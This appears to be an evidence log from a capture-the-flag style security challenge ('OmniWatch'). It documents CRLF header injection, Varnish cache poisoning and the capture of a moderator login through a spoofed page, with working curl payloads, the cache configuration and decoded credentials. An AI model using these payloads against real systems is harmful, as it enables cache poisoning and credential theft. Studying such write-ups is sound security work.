@@ -1,0 +1,38 @@
+OmniWatch - Evidence
+
+## 1. Oracle CRLF header injection (DeviceId reflect)
+$ curl 'http://154.57.164.82:31976/oracle/html/1%0d%0aFoo:%20bar'
+HTTP/1.1 200 OK
+DeviceId: 1
+Foo: bar                      <- injected header via CRLF in deviceId
+
+Also injects Content-Type: text/html and CacheKey: enable:
+$ curl 'http://154.57.164.82:31976/oracle/html/7%0d%0aCacheKey:%20enable'
+...
+DeviceId: 7
+CacheKey: enable
+Cache-Control: public, max-age=10   <- object now cacheable by Varnish
+
+## 2. Varnish cache key = only req.http.CacheKey (cache.vcl)
+sub vcl_hash { hash_data(req.http.CacheKey); return (lookup); }
+sub vcl_backend_response {
+  if (beresp.http.CacheKey == "enable") { beresp.ttl = 10s; ... } else { beresp.ttl = 0s; }
+}
+
+## 3. Absent vs empty CacheKey are DIFFERENT slots (critical fix)
+Poison with NO CacheKey header (fills the "absent" slot the browser uses):
+$ curl '.../oracle/FRESHABSENT/85%0d%0aContent-Type:%20text%2fhtml%0d%0aCacheKey:%20enable'
+$ curl '.../controller/login'    -> X-Cache: HIT, body contains FRESHABSENT (spoof served)
+
+(My earlier attempts used `CacheKey:` empty header -> wrong slot -> browser never saw it.)
+
+## 4. Headless Chrome (bot replication) loads the poisoned login page and its JS fetch
+   hits a separate "hitmark" Varnish slot:
+   page title = "Device Oracle API v2.6" (our spoof), hitmark DeviceId = ok, X-Cache HIT
+
+## 5. In-band moderator credential capture (no outbound egress from container)
+Spoofed login page typed into by Selenium; JS re-emits base64(user:pass) to slot owx1.
+Read back:
+  DeviceId: OGEyZDMzNDUzNmIyZjQxNDZhZjhjZjQ2YWNkODUxMTA6N2YxMDBiN2IzNjA5MmZiOWIwNmRmYjRmYWMzNjA5MzE=
+  decoded -> 8a2d334536b2f4146af8cf46acd85110:7f100b7b36092fb9b06dfb4fac360931
+  (moderator username : password, 32-hex each)
